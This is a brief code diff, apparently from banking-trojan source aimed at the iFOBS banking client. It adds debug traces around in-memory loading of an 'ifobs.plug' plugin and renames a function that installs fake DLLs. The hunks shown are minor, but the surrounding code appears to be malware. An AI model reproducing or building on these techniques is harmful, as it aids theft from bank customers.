@@ -442,10 +442,13 @@ static bool InitPlugin()
 	bool ret = false;
 	DWORD sizeIfobsPlug = 0;
 	BYTE* dataIFobsPlug = GetPlugin( "ifobs.plug", sizeIfobsPlug );
+	DBG( "IFobs", "1" );
 	TMemoryDLL ifobsPlug(dataIFobsPlug);
+	DBG( "IFobs", "2" );
 	ifobsPlug.SetNotFree();
 
 	PInitFunc InitFunc = (PInitFunc)ifobsPlug.GetProcAddress("InitFunc");
+	DBG( "IFobs", "3" );
 	if( InitFunc )
 	{
 		DBG( "IFobs", "есть InitFunc" );
@@ -697,7 +700,7 @@ void CreateFileReplacing( const char* s )
 
 
 
-DWORD WINAPI IntallFakeDll(void*)
+DWORD WINAPI InstallFakeDll(void*)
 {
 	const char* dlls[] =
 	{
